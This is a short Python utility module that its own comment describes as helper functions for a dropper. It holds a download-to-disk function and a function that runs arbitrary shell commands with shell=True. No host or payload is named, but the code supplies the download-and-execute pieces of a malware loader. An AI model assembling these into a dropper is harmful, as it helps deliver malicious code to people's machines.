# utils.py - Utility functions for the dropper.

import os
import requests
import subprocess

def download_file(url, destination):
    """
    Downloads a file from the given URL and saves it to the specified destination.

    :param url: URL of the file to download.
    :param destination: Local path where the file will be saved.
    """
    response = requests.get(url)
    with open(destination, 'wb') as file:
        file.write(response.content)

def run_command(command):
    """
    Runs a system command.

    :param command: Command to execute.
    """
    subprocess.run(command, shell=True)